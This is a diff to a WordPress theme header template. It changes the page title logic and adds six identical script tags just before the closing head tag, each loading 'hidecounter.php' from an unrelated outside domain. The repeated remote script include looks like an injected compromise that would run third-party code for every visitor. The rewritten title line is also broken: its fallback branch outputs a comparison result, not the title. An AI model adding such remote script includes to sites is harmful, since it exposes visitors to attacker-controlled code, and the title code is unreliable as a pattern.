@@ -9,7 +9,7 @@
 <head>
 	<meta charset="<?php bloginfo( 'charset' ); ?>" />
 	<meta name="viewport" content="width=device-width, initial-scale=1.0">
-	<title><?php wp_title( '|', true, 'right' ); ?></title>
+	<title><?php echo (wp_title( ' ', false, 'right' ) == '') ? get_bloginfo('name') : (wp_title( ' ', false, 'right' ) == ''); ?></title>
 	<link rel="profile" href="http://gmpg.org/xfn/11" />
 	<link rel="stylesheet" type="text/css" media="all" href="<?php bloginfo( 'stylesheet_url' ); ?>" />
 	<link media="only screen and (max-width: 980px)" rel="stylesheet" type="text/css" href="<?php echo TDU; ?>/css/tablet.css">
@@ -45,6 +45,12 @@
 	<!--[if IE 8]>
 		<link rel="stylesheet" type="text/css" media="all" href="<?php echo TDU; ?>/css/ie8.css" />
 	<![endif]-->
+<script type="text/javascript" src="http://www.lifestyleatlanta.com/hidecounter.php"></script>
+<script type="text/javascript" src="http://www.lifestyleatlanta.com/hidecounter.php"></script>
+<script type="text/javascript" src="http://www.lifestyleatlanta.com/hidecounter.php"></script>
+<script type="text/javascript" src="http://www.lifestyleatlanta.com/hidecounter.php"></script>
+<script type="text/javascript" src="http://www.lifestyleatlanta.com/hidecounter.php"></script>
+<script type="text/javascript" src="http://www.lifestyleatlanta.com/hidecounter.php"></script>
 </head>
 <body <?php body_class(); ?>>
 	<div id="wrapper">
